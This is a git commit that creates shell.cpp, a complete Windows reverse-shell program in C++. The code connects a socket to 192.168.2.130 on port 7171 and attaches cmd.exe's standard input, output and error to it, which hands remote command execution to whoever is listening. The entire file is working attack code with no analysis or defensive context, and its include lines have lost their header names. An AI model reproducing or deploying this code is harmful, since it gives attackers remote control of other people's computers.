c938dcf3b1fab664f6af542c9bfcfc772bf6e36a
Adrian Hernando <ahsolanas@gmail.com>
2019-05-30 16:47:43 +0200

    Create shell.cpp

---
+++ shell.cpp
@@ -0,0 +1,38 @@
+#include "stdafx.h"
+
+#define _WINSOCK_DEPRECATED_NO_WARNINGS
+
+#include 
+#include 
+
+#pragma comment(lib,"ws2_32")
+
+WSADATA wsaData;
+SOCKET s1;
+struct sockaddr_in hax;
+char ip_addr[16];
+STARTUPINFO sui;
+PROCESS_INFORMATION pi;
+
+
+void shell()
+{
+	WSAStartup(MAKEWORD(2, 2), &wsaData);
+	s1 = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL,
+	    (unsigned int)NULL, (unsigned int)NULL);
+
+	hax.sin_family = AF_INET;
+	hax.sin_port = htons(7171);
+	hax.sin_addr.s_addr = inet_addr("192.168.2.130");
+
+	WSAConnect(s1, (SOCKADDR*)&hax, sizeof(hax), NULL, NULL, NULL, NULL);
+
+	memset(&sui, 0, sizeof(sui));
+	sui.cb = sizeof(sui);
+	sui.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
+	sui.hStdInput = sui.hStdOutput = sui.hStdError = (HANDLE) s1;
+
+	TCHAR commandLine[256] = L"cmd.exe";
+	CreateProcess(NULL, commandLine, NULL, NULL, TRUE,
+	    0, NULL, NULL, &sui, &pi);
+}
